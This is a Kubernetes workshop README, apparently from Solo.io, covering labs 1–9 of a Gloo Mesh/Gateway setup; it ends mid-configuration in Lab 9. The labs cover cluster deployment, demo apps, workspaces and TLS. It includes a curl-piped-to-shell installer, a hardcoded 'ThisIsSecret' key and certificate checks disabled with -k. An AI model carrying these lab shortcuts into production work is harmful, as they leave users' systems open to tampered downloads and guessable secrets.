
<!--bash
#!/usr/bin/env bash

source ./scripts/assert.sh
-->



![Gloo Gateway](images/gloo-gateway.png)
# <center>Gloo Gateway Workshop</center>



## Table of Contents
* [Introduction](#introduction)
* [Lab 1 - Deploy a KinD cluster](#lab-1---deploy-a-kind-cluster-)
* [Lab 2 - Deploy and register Gloo Mesh](#lab-2---deploy-and-register-gloo-mesh-)
* [Lab 3 - Deploy the Bookinfo demo app](#lab-3---deploy-the-bookinfo-demo-app-)
* [Lab 4 - Deploy the httpbin demo app](#lab-4---deploy-the-httpbin-demo-app-)
* [Lab 5 - Deploy Gloo Mesh Addons](#lab-5---deploy-gloo-mesh-addons-)
* [Lab 6 - Create the gateways workspace](#lab-6---create-the-gateways-workspace-)
* [Lab 7 - Create the bookinfo workspace](#lab-7---create-the-bookinfo-workspace-)
* [Lab 8 - Expose the productpage through a gateway](#lab-8---expose-the-productpage-through-a-gateway-)
* [Lab 9 - Create the httpbin workspace](#lab-9---create-the-httpbin-workspace-)
* [Lab 10 - Expose an external service](#lab-10---expose-an-external-service-)
* [Lab 11 - Deploy Keycloak](#lab-11---deploy-keycloak-)
* [Lab 12 - Securing the access with OAuth](#lab-12---securing-the-access-with-oauth-)
* [Lab 13 - Use the transformation filter to manipulate headers](#lab-13---use-the-transformation-filter-to-manipulate-headers-)
* [Lab 14 - Use the DLP policy to mask sensitive data](#lab-14---use-the-dlp-policy-to-mask-sensitive-data-)
* [Lab 15 - Apply rate limiting to the Gateway](#lab-15---apply-rate-limiting-to-the-gateway-)
* [Lab 16 - Use the Web Application Firewall filter](#lab-16---use-the-web-application-firewall-filter-)
* [Lab 17 - Expose the bookinfo application through GraphQL](#lab-17---expose-the-bookinfo-application-through-graphql-)
* [Lab 18 - Leverage GraphQL stitching](#lab-18---leverage-graphql-stitching-)



## Introduction <a name="introduction"></a>

[Gloo Mesh Enterprise](https://www.solo.io/products/gloo-mesh/) is a management plane which makes it easy to operate [Istio](https://istio.io) on one or many Kubernetes clusters deployed anywhere (any platform, anywhere).

### Istio support

The Gloo Mesh Enterprise subscription includes end to end Istio support:

- Upstream first
- Specialty builds available (FIPS, ARM, etc)
- Long Term Support (LTS) N-4 
- Critical security patches
- Production break-fix
- One hour SLA Severity 1
- Install / upgrade
- Architecture and operational guidance, best practices

### Gloo Mesh overview

Gloo Mesh provides many unique features, including:

- multi-tenancy based on global workspaces
- zero trust enforcement
- global observability (centralized metrics and access logging)
- simplified cross cluster communications (using virtual destinations)
- advanced gateway capabilities (oauth, jwt, transformations, rate limiting, web application firewall, ...)

![Gloo Mesh graph](images/gloo-mesh-graph.png)

### Want to learn more about Gloo Mesh

You can find more information about Gloo Mesh in the official documentation:

[https://docs.solo.io/gloo-mesh/latest/](https://docs.solo.io/gloo-mesh/latest/)




## Lab 1 - Deploy a KinD cluster <a name="lab-1---deploy-a-kind-cluster-"></a>


Clone this repository and go to the directory where this `README.md` file is.

Set the context environment variables:

```bash
export MGMT=cluster1
export CLUSTER1=cluster1
```

Run the following commands to deploy a Kubernetes cluster using [Kind](https://kind.sigs.k8s.io/):

```bash
./scripts/deploy.sh 1 cluster1 us-west us-west-1
```

Then run the following commands to wait for all the Pods to be ready:

```bash
./scripts/check.sh cluster1
```

**Note:** If you run the `check.sh` script immediately after the `deploy.sh` script, you may see a jsonpath error. If that happens, simply wait a few seconds and try again.

Once the `check.sh` script completes, when you execute the `kubectl get pods -A` command, you should see the following:

```
NAMESPACE            NAME                                          READY   STATUS    RESTARTS   AGE
kube-system          calico-kube-controllers-59d85c5c84-sbk4k      1/1     Running   0          4h26m
kube-system          calico-node-przxs                             1/1     Running   0          4h26m
kube-system          coredns-6955765f44-ln8f5                      1/1     Running   0          4h26m
kube-system          coredns-6955765f44-s7xxx                      1/1     Running   0          4h26m
kube-system          etcd-cluster1-control-plane                   1/1     Running   0          4h27m
kube-system          kube-apiserver-cluster1-control-plane         1/1     Running   0          4h27m
kube-system          kube-controller-manager-cluster1-control-plane1/1     Running   0          4h27m
kube-system          kube-proxy-ksvzw                              1/1     Running   0          4h26m
kube-system          kube-scheduler-cluster1-control-plane         1/1     Running   0          4h27m
local-path-storage   local-path-provisioner-58f6947c7-lfmdx        1/1     Running   0          4h26m
metallb-system       controller-5c9894b5cd-cn9x2                   1/1     Running   0          4h26m
metallb-system       speaker-d7jkp                                 1/1     Running   0          4h26m
```
<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Clusters are healthy", () => {
    const clusters = [process.env.MGMT, process.env.CLUSTER1];
    clusters.forEach(cluster => {
        it(`Cluster ${cluster} is healthy`, () => helpers.k8sObjectIsPresent({ context: cluster, namespace: "default", k8sType: "service", k8sObj: "kubernetes" }));
    });
});
EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/deploy-kind-cluster/tests/cluster-healthy.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->



## Lab 2 - Deploy and register Gloo Mesh <a name="lab-2---deploy-and-register-gloo-mesh-"></a>
[<img src="https://img.youtube.com/vi/djfFiepK4GY/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/djfFiepK4GY "Video Link")


First of all, let's install the `meshctl` CLI:

```bash
export GLOO_MESH_VERSION=v2.4.6
curl -sL https://run.solo.io/meshctl/install | sh -
export PATH=$HOME/.gloo-mesh/bin:$PATH
```

Run the following commands to deploy the Gloo Mesh management plane:

<!--bash
cat <<'EOF' > ./test.js
var chai = require('chai');
var expect = chai.expect;

describe("Required environment variables should contain value", () => {
  afterEach(function(done){
    if(this.currentTest.currentRetry() > 0){
      process.stdout.write(".");
       setTimeout(done, 1000);
    } else {
      done();
    }
  });

  it("Context environment variables should not be empty", () => {
    expect(process.env.MGMT).to.not.be.empty
    expect(process.env.CLUSTER1).to.not.be.empty
  });

  it("Gloo Mesh licence environment variables should not be empty", () => {
    expect(process.env.GLOO_MESH_LICENSE_KEY).to.not.be.empty
  });
});
EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/deploy-and-register-gloo-mesh/tests/environment-variables.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

```bash
helm repo add gloo-platform https://storage.googleapis.com/gloo-platform/helm-charts
helm repo update
kubectl --context ${MGMT} create ns gloo-mesh
helm upgrade --install gloo-platform-crds gloo-platform/gloo-platform-crds \
--namespace gloo-mesh \
--kube-context ${MGMT} \
--version=2.4.6
helm upgrade --install gloo-platform-mgmt gloo-platform/gloo-platform \
--namespace gloo-mesh \
--kube-context ${MGMT} \
--version=2.4.6 \
 -f -<<EOF
licensing:
  licenseKey: ${GLOO_MESH_LICENSE_KEY}
common:
  cluster: cluster1
glooMgmtServer:
  enabled: true
  ports:
    healthcheck: 8091
  registerCluster: true
prometheus:
  enabled: true
redis:
  deployment:
    enabled: true
telemetryGateway:
  enabled: true
  service:
    type: LoadBalancer
glooUi:
  enabled: true
  serviceType: LoadBalancer
istioInstallations:
  enabled: true
  controlPlane:
    enabled: true
    installations:
      - istioOperatorSpec:
          hub: us-docker.pkg.dev/gloo-mesh/istio-workshops
          tag: 1.19.3-solo
        revision: 1-19
  northSouthGateways:
    - enabled: true
      name: istio-ingressgateway
      installations:
        - clusters:
          - name: cluster1
            activeGateway: false
          gatewayRevision: 1-19
          istioOperatorSpec:
            hub: us-docker.pkg.dev/gloo-mesh/istio-workshops
            tag: 1.19.3-solo
            profile: empty
            components:
              ingressGateways:
                - name: istio-ingressgateway
                  namespace: istio-gateways
                  enabled: true
                  label:
                    istio: ingressgateway
glooAgent:
  enabled: true
  relay:
    serverAddress: gloo-mesh-mgmt-server:9900
    authority: gloo-mesh-mgmt-server.gloo-mesh
telemetryCollector:
  enabled: true
  config:
    exporters:
      otlp:
        endpoint: gloo-telemetry-gateway:4317
EOF
kubectl --context ${MGMT} -n gloo-mesh rollout status deploy/gloo-mesh-mgmt-server
kubectl --context ${MGMT} delete workspaces -A --all
kubectl --context ${MGMT} delete workspacesettings -A --all
timeout 2m bash -c "until [[ \$(kubectl --context ${MGMT} -n istio-gateways get deploy -o json | jq '[.items[].status.readyReplicas] | add') -ge 1 ]]; do
  sleep 1
done"
```
<!--bash
kubectl wait --context ${MGMT} --for=condition=Ready -n gloo-mesh --all pod
timeout 2m bash -c "until [[ \$(kubectl --context ${MGMT} -n gloo-mesh get svc gloo-mesh-mgmt-server -o json | jq '.status.loadBalancer | length') -gt 0 ]]; do
  sleep 1
done"
-->
```bash
export HOST_GW_CLUSTER1="$(kubectl --context ${CLUSTER1} -n istio-gateways get svc -l istio=ingressgateway -o jsonpath='{.items[0].status.loadBalancer.ingress[0].*}')"
```
<!--bash
cat <<'EOF' > ./test.js
var chai = require('chai');
var expect = chai.expect;
const helpers = require('./tests/chai-exec');
describe("Cluster registration", () => {
  it("cluster1 is registered", () => {
    podName = helpers.getOutputForCommand({ command: "kubectl -n gloo-mesh get pods -l app=gloo-mesh-mgmt-server -o jsonpath='{.items[0].metadata.name}' --context " + process.env.MGMT }).replaceAll("'", "");
    command = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.MGMT + " -n gloo-mesh debug -q -i " + podName + " --image=curlimages/curl -- curl -s http://localhost:9091/metrics" }).replaceAll("'", "");
    expect(command).to.contain("cluster1");
  });
});
EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/deploy-and-register-gloo-mesh/tests/cluster-registration.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->



## Lab 3 - Deploy the Bookinfo demo app <a name="lab-3---deploy-the-bookinfo-demo-app-"></a>
[<img src="https://img.youtube.com/vi/nzYcrjalY5A/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/nzYcrjalY5A "Video Link")

We're going to deploy the bookinfo application to demonstrate several features of Gloo Mesh.

You can find more information about this application [here](https://istio.io/latest/docs/examples/bookinfo/).

Run the following commands to deploy the bookinfo application on `cluster1`:

```bash
curl https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/platform/kube/bookinfo.yaml > bookinfo.yaml

kubectl --context ${CLUSTER1} create ns bookinfo-frontends
kubectl --context ${CLUSTER1} create ns bookinfo-backends
# deploy the frontend bookinfo service in the bookinfo-frontends namespace
kubectl --context ${CLUSTER1} -n bookinfo-frontends apply -f bookinfo.yaml -l 'account in (productpage)'
kubectl --context ${CLUSTER1} -n bookinfo-frontends apply -f bookinfo.yaml -l 'app in (productpage)'
kubectl --context ${CLUSTER1} -n bookinfo-backends apply -f bookinfo.yaml -l 'account in (reviews,ratings,details)'
# deploy the backend bookinfo services in the bookinfo-backends namespace for all versions less than v3
kubectl --context ${CLUSTER1} -n bookinfo-backends apply -f bookinfo.yaml -l 'app in (reviews,ratings,details),version notin (v3)'
# Update the productpage deployment to set the environment variables to define where the backend services are running
kubectl --context ${CLUSTER1} -n bookinfo-frontends set env deploy/productpage-v1 DETAILS_HOSTNAME=details.bookinfo-backends.svc.cluster.local
kubectl --context ${CLUSTER1} -n bookinfo-frontends set env deploy/productpage-v1 REVIEWS_HOSTNAME=reviews.bookinfo-backends.svc.cluster.local
# Update the reviews service to display where it is coming from
kubectl --context ${CLUSTER1} -n bookinfo-backends set env deploy/reviews-v1 CLUSTER_NAME=${CLUSTER1}
kubectl --context ${CLUSTER1} -n bookinfo-backends set env deploy/reviews-v2 CLUSTER_NAME=${CLUSTER1}
```


<!--bash
until [[ $(kubectl --context ${CLUSTER1} -n bookinfo-frontends get deploy -o json | jq '[.items[].status.readyReplicas] | add') -eq 1 ]]; do
  sleep 1
done
until [[ $(kubectl --context ${CLUSTER1} -n bookinfo-backends get deploy -o json | jq '[.items[].status.readyReplicas] | add') -eq 4 ]]; do
  sleep 1
done
-->

You can check that the app is running using the following command:

```
kubectl --context ${CLUSTER1} -n bookinfo-frontends get pods && kubectl --context ${CLUSTER1} -n bookinfo-backends get pods
```

Note that we deployed the `productpage` service in the `bookinfo-frontends` namespace and the other services in the `bookinfo-backends` namespace.

And we deployed the `v1` and `v2` versions of the `reviews` microservice, not the `v3` version.

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Bookinfo app", () => {
  let cluster = process.env.CLUSTER1
  let deployments = ["productpage-v1"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "bookinfo-frontends", k8sObj: deploy }));
  });
  deployments = ["ratings-v1", "details-v1", "reviews-v1", "reviews-v2"];
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "bookinfo-backends", k8sObj: deploy }));
  });
});
EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/apps/bookinfo/deploy-bookinfo/tests/check-bookinfo.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->




## Lab 4 - Deploy the httpbin demo app <a name="lab-4---deploy-the-httpbin-demo-app-"></a>
[<img src="https://img.youtube.com/vi/w1xB-o_gHs0/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/w1xB-o_gHs0 "Video Link")

We're going to deploy the httpbin application to demonstrate several features of Gloo Mesh.

You can find more information about this application [here](http://httpbin.org/).



Run the following commands to deploy the httpbin app on `cluster1`. The deployment will be called `not-in-mesh` and won't have the sidecar injected (because we don't label the namespace).

```bash
kubectl --context ${CLUSTER1} create ns httpbin
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: not-in-mesh
  namespace: httpbin
---
apiVersion: v1
kind: Service
metadata:
  name: not-in-mesh
  namespace: httpbin
  labels:
    app: not-in-mesh
    service: not-in-mesh
spec:
  ports:
  - name: http
    port: 8000
    targetPort: 80
  selector:
    app: not-in-mesh
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: not-in-mesh
  namespace: httpbin
spec:
  replicas: 1
  selector:
    matchLabels:
      app: not-in-mesh
      version: v1
  template:
    metadata:
      labels:
        app: not-in-mesh
        version: v1
    spec:
      serviceAccountName: not-in-mesh
      containers:
      - image: docker.io/kennethreitz/httpbin
        imagePullPolicy: IfNotPresent
        name: not-in-mesh
        ports:
        - containerPort: 80
EOF
```



You can follow the progress using the following command:

```
kubectl --context ${CLUSTER1} -n httpbin get pods
```

```
NAME                           READY   STATUS    RESTARTS   AGE
not-in-mesh-5c64bb49cd-m9kwm   1/1     Running   0          11s
```
<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("httpbin app", () => {
  let cluster = process.env.CLUSTER1
  
  let deployments = ["not-in-mesh"];
  
  deployments.forEach(deploy => {
    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "httpbin", k8sObj: deploy }));
  });
});
EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/apps/httpbin/deploy-httpbin/tests/check-httpbin.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->



## Lab 5 - Deploy Gloo Mesh Addons <a name="lab-5---deploy-gloo-mesh-addons-"></a>
[<img src="https://img.youtube.com/vi/_rorug_2bk8/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/_rorug_2bk8 "Video Link")

To use the Gloo Mesh Gateway advanced features (external authentication, rate limiting, ...), you need to install the Gloo Mesh addons.

First, you need to create a namespace for the addons, with Istio injection enabled:

```bash
kubectl --context ${CLUSTER1} create namespace gloo-mesh-addons
kubectl --context ${CLUSTER1} label namespace gloo-mesh-addons istio.io/rev=1-19 --overwrite
```

Then, you can deploy the addons on the cluster(s) using Helm:

```bash
timeout 2m bash -c "until [[ \$(kubectl --context ${MGMT} -n istio-system get deploy istiod-1-19 -o json | jq '.status.availableReplicas') -gt 0 ]]; do
  sleep 1
done"
helm repo add gloo-mesh-agent https://storage.googleapis.com/gloo-mesh-enterprise/gloo-mesh-agent
helm repo update
helm upgrade --install gloo-platform gloo-platform/gloo-platform \
  --namespace gloo-mesh-addons \
  --kube-context=${CLUSTER1} \
  --version 2.4.6 \
 -f -<<EOF
common:
  cluster: cluster1
glooAgent:
  enabled: false
extAuthService:
  enabled: true
  extAuth:
    apiKeyStorage:
      name: redis
      enabled: true
      config: 
        connection: 
          host: redis.gloo-mesh-addons:6379
      secretKey: ThisIsSecret
rateLimiter:
  enabled: true
EOF
```

For teams to setup external authentication, the gateways team needs to create and `ExtAuthServer` object they can reference.

Let's create the `ExtAuthServer` object: 

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: ExtAuthServer
metadata:
  name: ext-auth-server
  namespace: gloo-mesh-addons
spec:
  destinationServer:
    ref:
      cluster: cluster1
      name: ext-auth-service
      namespace: gloo-mesh-addons
    port:
      name: grpc
  requestBody: {} # Needed if some an extauth plugin must access the body of the requests
EOF
```

For teams to setup rate limiting, the gateways team needs to create and `RateLimitServerSettings` object they can reference.

Let's create the `RateLimitServerSettings` object:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: RateLimitServerSettings
metadata:
  name: rate-limit-server
  namespace: gloo-mesh-addons
spec:
  destinationServer:
    ref:
      cluster: cluster1
      name: rate-limiter
      namespace: gloo-mesh-addons
    port:
      name: grpc
EOF
```

This is what the environment looks like now:

![Gloo Platform Workshop Environment](images/steps/deploy-gloo-mesh-addons/gloo-mesh-workshop-environment.svg)




## Lab 6 - Create the gateways workspace <a name="lab-6---create-the-gateways-workspace-"></a>
[<img src="https://img.youtube.com/vi/QeVBH0eswWw/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/QeVBH0eswWw "Video Link")

We're going to create a workspace for the team in charge of the Gateways.

The platform team needs to create the corresponding `Workspace` Kubernetes objects in the Gloo Mesh management cluster.

Let's create the `gateways` workspace which corresponds to the `istio-gateways` and the `gloo-mesh-addons` namespaces on the cluster(s):

```bash
kubectl apply --context ${MGMT} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: Workspace
metadata:
  name: gateways
  namespace: gloo-mesh
spec:
  workloadClusters:
  - name: cluster1
    namespaces:
    - name: istio-gateways
    - name: gloo-mesh-addons
EOF
```

Then, the Gateway team creates a `WorkspaceSettings` Kubernetes object in one of the namespaces of the `gateways` workspace (so the `istio-gateways` or the `gloo-mesh-addons` namespace):

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: WorkspaceSettings
metadata:
  name: gateways
  namespace: gloo-mesh-addons
spec:
  importFrom:
  - workspaces:
    - selector:
        allow_ingress: "true"
    resources:
    - kind: SERVICE
    - kind: ALL
      labels:
        expose: "true"
  exportTo:
  - workspaces:
    - selector:
        allow_ingress: "true"
    resources:
    - kind: SERVICE
EOF
```

The Gateway team has decided to import the following from the workspaces that have the label `allow_ingress` set to `true` (using a selector):
- all the Kubernetes services exported by these workspaces
- all the resources (RouteTables, VirtualDestination, ...) exported by these workspaces that have the label `expose` set to `true`



## Lab 7 - Create the bookinfo workspace <a name="lab-7---create-the-bookinfo-workspace-"></a>

We're going to create a workspace for the team in charge of the Bookinfo application.

The platform team needs to create the corresponding `Workspace` Kubernetes objects in the Gloo Mesh management cluster.

Let's create the `bookinfo` workspace which corresponds to the `bookinfo-frontends` and `bookinfo-backends` namespaces on the cluster(s):

```bash
kubectl apply --context ${MGMT} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: Workspace
metadata:
  name: bookinfo
  namespace: gloo-mesh
  labels:
    allow_ingress: "true"
spec:
  workloadClusters:
  - name: cluster1
    namespaces:
    - name: bookinfo-frontends
    - name: bookinfo-backends
EOF
```

Then, the Bookinfo team creates a `WorkspaceSettings` Kubernetes object in one of the namespaces of the `bookinfo` workspace (so the `bookinfo-frontends` or the `bookinfo-backends` namespace):

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: WorkspaceSettings
metadata:
  name: bookinfo
  namespace: bookinfo-frontends
spec:
  importFrom:
  - workspaces:
    - name: gateways
    resources:
    - kind: SERVICE
  exportTo:
  - workspaces:
    - name: gateways
    resources:
    - kind: SERVICE
      labels:
        app: productpage
    - kind: SERVICE
      labels:
        app: reviews
    - kind: SERVICE
      labels:
        app: ratings
    - kind: ALL
      labels:
        expose: "true"
EOF
```

The Bookinfo team has decided to export the following to the `gateway` workspace (using a reference):
- the `productpage` and the `reviews` Kubernetes services
- all the resources (RouteTables, VirtualDestination, ...) that have the label `expose` set to `true`

This is how the environment looks like with the workspaces:

![Gloo Mesh Workspaces](images/steps/create-bookinfo-workspace/gloo-mesh-workspaces.svg)




## Lab 8 - Expose the productpage through a gateway <a name="lab-8---expose-the-productpage-through-a-gateway-"></a>
[<img src="https://img.youtube.com/vi/emyIu99AOOA/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/emyIu99AOOA "Video Link")

In this step, we're going to expose the `productpage` service through the Ingress Gateway using Gloo Mesh.

The Gateway team must create a `VirtualGateway` to configure the Istio Ingress Gateway in cluster1 to listen to incoming requests.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: VirtualGateway
metadata:
  name: north-south-gw
  namespace: istio-gateways
spec:
  workloads:
    - selector:
        labels:
          istio: ingressgateway
        cluster: cluster1
  listeners: 
    - http: {}
      port:
        number: 80
      allowedRouteTables:
        - host: '*'
EOF

```

Then, the Gateway team should create a parent `RouteTable` to configure the main routing.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: main-bookinfo
  namespace: istio-gateways
spec:
  hosts:
    - cluster1-bookinfo.example.com
    - cluster2-bookinfo.example.com
  virtualGateways:
    - name: north-south-gw
      namespace: istio-gateways
      cluster: cluster1
  workloadSelectors: []
  http:
    - name: root
      matchers:
      - uri:
          prefix: /
      delegate:
        routeTables:
          - labels:
              expose: "true"
            workspace: bookinfo
          - labels:
              expose: "true"
            workspace: gateways
        sortMethod: ROUTE_SPECIFICITY
---
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: main-httpbin
  namespace: istio-gateways
spec:
  hosts:
    - cluster1-httpbin.example.com
  virtualGateways:
    - name: north-south-gw
      namespace: istio-gateways
      cluster: cluster1
  workloadSelectors: []
  http:
    - name: root
      matchers:
      - uri:
          prefix: /
      delegate:
        routeTables:
          - labels:
              expose: "true"
            workspace: httpbin
        sortMethod: ROUTE_SPECIFICITY
EOF
```

In this example, you can see that the Gateway team is delegating the routing details to the `bookinfo` and `httpbin` workspaces. The teams in charge of these workspaces can expose their services through the gateway.

The Gateway team can use this main `RouteTable` to enforce a global WAF policy, but also to have control on which hostnames and paths can be used by each application team.

Then, the Bookinfo team can create a `RouteTable` to determine how they want to handle the traffic.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: productpage
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  http:
    - name: productpage
      matchers:
      - uri:
          exact: /productpage
      - uri:
          prefix: /static
      - uri:
          prefix: /api/v1/products
      forwardTo:
        destinations:
          - ref:
              name: productpage
              namespace: bookinfo-frontends
              cluster: cluster1
            port:
              number: 9080
EOF
```
Let's add the domain to our `/etc/hosts` file:

```bash
./scripts/register-domain.sh cluster1-bookinfo.example.com ${HOST_GW_CLUSTER1}
./scripts/register-domain.sh cluster1-httpbin.example.com ${HOST_GW_CLUSTER1}
```

You can access the `productpage` service using this URL: [http://cluster1-bookinfo.example.com/productpage](http://cluster1-bookinfo.example.com/productpage).

You should now be able to access the `productpage` application through the browser.
<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Productpage is available (HTTP)", () => {
  it('/productpage is available in cluster1', () => helpers.checkURL({ host: `http://cluster1-bookinfo.example.com`, path: '/productpage', retCode: 200 }));
})
EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/apps/bookinfo/gateway-expose/tests/productpage-available.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Gloo Mesh translates the `VirtualGateway` and `RouteTable` into the corresponding Istio objects (`Gateway` and `VirtualService`).

Now, let's secure the access through TLS.
Let's first create a private key and a self-signed certificate:

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
   -keyout tls.key -out tls.crt -subj "/CN=*"
```

Then, you have to store them in a Kubernetes secret running the following commands:

```bash
kubectl --context ${CLUSTER1} -n istio-gateways create secret generic tls-secret \
--from-file=tls.key=tls.key \
--from-file=tls.crt=tls.crt
```

Finally, the Gateway team needs to update the `VirtualGateway` to use this secret:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: VirtualGateway
metadata:
  name: north-south-gw
  namespace: istio-gateways
spec:
  workloads:
    - selector:
        labels:
          istio: ingressgateway
        cluster: cluster1
  listeners: 
    - http: {}
      port:
        number: 80
# ---------------- Redirect to https --------------------
      httpsRedirect: true
# -------------------------------------------------------
    - http: {}
# ---------------- SSL config ---------------------------
      port:
        number: 443
      tls:
        parameters:
          minimumProtocolVersion: TLSv1_3
        mode: SIMPLE
        secretName: tls-secret
# -------------------------------------------------------
      allowedRouteTables:
        - host: '*'

EOF
```

You can now access the `productpage` application securely through the browser.

Notice that we specificed a minimumProtocolVersion, so if the client is trying to use an deprecated TLS version the request will be denied.

To test this, we can try to send a request with `tlsv1.2`:

```console
curl --tlsv1.2 --tls-max 1.2 --key tls.key --cert tls.crt https://cluster1-bookinfo.example.com/productpage -k
```

You should get the following output:

```nocopy
curl: (35) error:1409442E:SSL routines:ssl3_read_bytes:tlsv1 alert protocol version
```

Now, you can try the most recent `tlsv1.3`:

```console
curl --tlsv1.3 --tls-max 1.3 --key tls.key --cert tls.crt https://cluster1-bookinfo.example.com/productpage -k
```

And after this you should get the actual Productpage.
You can now access the `productpage` service using this URL: [https://cluster1-bookinfo.example.com/productpage](https://cluster1-bookinfo.example.com/productpage).

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Productpage is available (HTTPS)", () => {
  it('/productpage is available in cluster1', () => helpers.checkURL({ host: `https://cluster1-bookinfo.example.com`, path: '/productpage', retCode: 200 }));
})
EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/apps/bookinfo/gateway-expose/tests/productpage-available-secure.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->
<!--bash
cat <<'EOF' > ./test.js
var chai = require('chai');
var expect = chai.expect;
const helpers = require('./tests/chai-exec');

describe("Otel metrics", () => {
  it("cluster1 is sending metrics to telemetryGateway", () => {
    podName = helpers.getOutputForCommand({ command: "kubectl -n gloo-mesh get pods -l app=prometheus -o jsonpath='{.items[0].metadata.name}' --context " + process.env.MGMT }).replaceAll("'", "");
    command = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.MGMT + " -n gloo-mesh debug -q -i " + podName + " --image=curlimages/curl -- curl -s http://localhost:9090/api/v1/query?query=istio_requests_total" }).replaceAll("'", "");
    expect(command).to.contain("cluster\":\"cluster1");
  });
});


EOF
echo "executing test dist/gloo-mesh-2-0-gateway-standalone/build/templates/steps/apps/bookinfo/gateway-expose/tests/otel-metrics.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=150 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

This diagram shows the flow of the request (through the Istio Ingress Gateway):

![Gloo Mesh Gateway](images/steps/gateway-expose/gloo-mesh-gateway.svg)




## Lab 9 - Create the httpbin workspace <a name="lab-9---create-the-httpbin-workspace-"></a>

We're going to create a workspace for the team in charge of the httpbin application.

The platform team needs to create the corresponding `Workspace` Kubernetes objects in the Gloo Mesh management cluster.

Let's create the `httpbin` workspace which corresponds to the `httpbin` namespace on `cluster1`:

```bash
kubectl apply --context ${MGMT} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: Workspace
metadata:
  name: httpbin
  namespace: gloo-mesh
  labels:
    allow_ingress: "true"
spec:
  workloadClusters:
  - name: cluster1
    namespaces:
    - name: httpbin
EOF
```

Then, the Httpbin team creates a `WorkspaceSettings` Kubernetes object in one of the namespaces of the `httpbin` workspace:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: WorkspaceSettings
metadata:
  name: httpbin
  namespace: httpbin
spec:
  importFrom:
  - workspaces:
    - name: gateways
    resources:
    - kind: SERVICE
  exportTo:
